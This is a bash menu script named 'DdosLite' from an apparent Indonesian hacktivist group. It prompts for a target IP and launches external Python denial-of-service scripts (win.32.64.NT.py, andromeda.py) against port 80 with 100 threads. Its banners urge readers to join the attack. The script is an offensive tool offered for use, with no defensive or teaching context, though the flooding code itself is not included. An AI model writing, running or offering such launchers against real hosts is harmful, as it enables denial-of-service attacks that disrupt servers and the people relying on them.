blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'                                           
yellow='\033[33;1m'
clear
toilet -f slant " DdosLite " |lolcat
echo
echo
echo $red"##################"
echo $black"Author : m34n5t4"
echo $white"VERSION=1.2"
echo $green"Cyber Net Muslim"
echo $red"##################"
echo $black"DOS WIN32,64 NT AND ANDROMEDA         "
echo $white"      Ikut Menyerang Dengn Jalur Cyber Dan Doa        "
echo $green"##################"
echo $purple"                 Pilihan"
echo $white"##################"
echo $red"[1].TROJAN WIN32,64.NT"
echo $red"[2].ANDROMEDA XR"
echo $white"##################"
echo $green"MASUKAN PILIHAN ANDA"
read -p "PILIH===>" bro;
echo
if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
toilet -f slant " WIN32 " |lolcat
echo $red"MASUKAN IP TARGET"
read -p "===>" ipt
clear
echo
python win.32.64.NT.py -s$ipt -p80 -t100
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
toilet -f slant " DROID RX " |lolcat
echo $red"MASUKAN IP TARGET"
read -p "===>" ipt
clear
echo
python andromeda.py -s$ipt -p80 -t100
fi
